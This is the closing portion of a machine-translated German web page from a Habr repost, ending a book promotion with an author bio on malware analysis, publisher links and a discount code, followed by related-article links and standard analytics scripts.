VMware-Virtualisierung sowie Tools zum Erkennen innovativer Malware, einschlie√ülich infizierter Kernelmodule.  Er verf√ºgt √ºber zehn Jahre Erfahrung als Analyst auf dem Gebiet der Computersicherheit und gilt zu Recht als Experte f√ºr die Analyse und Interpretation sowohl b√∂sartiger als auch gew√∂hnlicher Programme. <br><br>  ¬ªWeitere Informationen zum Buch finden Sie auf <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">der Website des Herausgebers</a> <br>  ¬ª <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Inhalt</a> <br>  ¬ª <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Auszug</a> <br><br>  F√ºr Khabrozhiteley 20% Rabatt auf den Gutschein - <b>Eine Autopsie wird zeigen</b> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de416143/">https://habr.com/ru/post/de416143/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de416131/index.html">Wie man mit PD in der Russischen F√∂deration umgeht und nicht gegen das Gesetz verst√∂√üt</a></li>
<li><a href="../de416133/index.html">Rechenzentrum im Ausland: Equinix LD8</a></li>
<li><a href="../de416135/index.html">GUI-Anwendung kleiner als 1 kb</a></li>
<li><a href="../de416137/index.html">Zabbix als Sicherheitsscanner</a></li>
<li><a href="../de416139/index.html">Starke Authentifizierung als Teil der GDPR-Strategie</a></li>
<li><a href="../de416147/index.html">Organisation der Navigation in iOS-Anwendungen mit dem Root Controller</a></li>
<li><a href="../de416149/index.html">Fragen und Antworten zu erneuerbaren Energien, Teil 1</a></li>
<li><a href="../de416151/index.html">Dimensionsloser Ballon. Utilitaristische Dimensionsanalyse Magie</a></li>
<li><a href="../de416153/index.html">Werden Flugzeuge zuverl√§ssiger? Flugzeughersteller f√ºhren Roboter in Unternehmen ein</a></li>
<li><a href="../de416155/index.html">WebSockets in Angular: Erstellen Sie einen Angular-Service f√ºr die Arbeit mit Web-Sockets</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>